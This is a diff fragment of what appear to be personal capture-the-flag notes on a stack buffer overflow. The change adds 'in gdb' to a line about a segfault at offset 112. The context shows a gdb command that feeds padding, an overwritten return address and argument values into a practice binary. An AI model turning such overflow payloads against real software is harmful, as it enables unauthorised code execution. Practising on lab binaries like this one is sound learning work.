@@ -31,7 +31,7 @@ So I tried repeating that byte sequence as the junk bytes, but got another error
 ------------------------------------
 Coming back for a try 2 after a week
 -----------------------------------
-I immediately ran it with input cyclic(512) to find that it seg faults at 112
+I immediately ran it with input cyclic(512) in gdb to find that it seg faults at 112
 
 so I tried 
 (gdb) run < <(echo -ne "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x96\x92\x04\x08\r\xf0\xfe\xca\r\xf0\r\xf0")
